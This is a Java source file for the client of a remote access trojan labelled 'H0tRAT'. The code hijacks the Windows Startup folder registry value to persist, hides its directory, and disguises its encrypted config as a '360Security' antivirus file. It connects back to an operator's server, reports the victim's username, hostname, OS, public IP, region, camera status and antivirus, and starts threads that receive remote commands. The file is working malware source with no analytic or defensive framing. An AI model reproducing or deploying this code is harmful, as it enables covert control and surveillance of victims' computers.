package me.client;

import com.sun.jna.WString;
import com.sun.jna.platform.win32.*;
import me.client.send.*;
import me.client.filecopy.JarUtil;
import me.client.utils.*;

import java.io.*;
import java.net.*;
import javax.swing.*;

public class Client {
    public static final String HEAD = "H0tRAT";
    public static boolean isturn = false;
    public static Socket socket;
    public static InetSocketAddress inetSocketAddress;
    public static String getPath() throws IOException {
            File file = new File(System.getProperty("user.home") + "\\AppData" + "\\Windows");
            if(!file.exists()) {
                file.mkdirs();
            }
            return file.getPath();
        }
    public static String getPath1() throws IOException {
        File file = new File(System.getProperty("user.home") + "\\AppData" +"\\360Security");
        if(!file.exists()) {
            file.mkdirs();
        }
        return file.getPath();
    }

    public static void register() throws IOException {
        Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup",getPath());
        LoadDLL.instance.HideFile1(new WString(getPath()));
    }

    public static String GetIP() {
        String IP = "";
        String temp1 = "";
        try {
            FileInputStream fileInputStream = new FileInputStream(getPath1() + "\\360Security.ini");
            String temp = "";
            byte[] bytes = new byte[256];
            int len = 0;
            while ((len = fileInputStream.read(bytes))!=-1) {
                temp += new String(bytes,0,len);
            }
            temp1 = new String(AESUtils.decrypt(temp));
            IP = temp1.substring(temp1.indexOf("IP:") + 3,temp1.indexOf("|"));
        }catch (Exception e) {
            e.printStackTrace();
        }
        return IP;
    }

    public static int GetPort() {
        String Port = "";
        int port = 0;
        try {
            FileInputStream fileInputStream = new FileInputStream(getPath1() + "\\360Security.ini");
            String temp = "";
            String temp1 = "";
            byte[] bytes = new byte[256];
            int len = 0;
            while ((len = fileInputStream.read(bytes))!=-1) {
                temp += new String(bytes,0,len);
            }
            temp1 = new String(AESUtils.decrypt(temp));
            Port = temp1.substring(temp1.indexOf("Port:") + 5);
            port = Integer.parseInt(Port);
        }catch (Exception e) {
        }
        return port;
    }
    public static void relieve() throws IOException {
        //解除主机
        Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup","wowWTF");
        File file = new File(getPath() + "\\javaw.jar");
        file.deleteOnExit();
        System.exit(0);
    }

    public static void main(String[] args) throws Exception {
        UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
        LoadDLL.instance.Lock();
        register();
        inetSocketAddress = new InetSocketAddress(GetIP(),GetPort());
        try {
            while (!isturn) {
                con();
            }
        }catch (Exception e) {
        }
    }
    public static void con() {
        try {
            socket = new Socket();
            socket.connect(inetSocketAddress);
            isturn = true;
            JarUtil jarUtil = new JarUtil(Client.class);
            String IP = GetInternetIP.getIP();
            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
            dataOutputStream.writeUTF(HEAD);
            dataOutputStream.writeUTF(System.getProperty("user.name"));
            dataOutputStream.writeUTF(InetAddress.getLocalHost().getHostName());
            dataOutputStream.writeUTF(System.getProperty("os.name"));
            dataOutputStream.writeUTF(IP);
            dataOutputStream.writeUTF(GetInternetIP.getRegion(IP));
            dataOutputStream.writeUTF(jarUtil.getJarName());
            dataOutputStream.writeUTF(SystemInfo.getCurrentPID());
            dataOutputStream.writeUTF(SystemInfo.camera());
            new GetAntivirus(dataOutputStream).start();
            new SendHeartPack(socket).start();
            new ReceiveMessage(socket).start();
        }catch (Exception e) {
            isturn = false;
        }
    }

    public static void recon() {
        while (!isturn) {
            try {
                con();
            }catch (Exception e) {
            }
        }
    }
}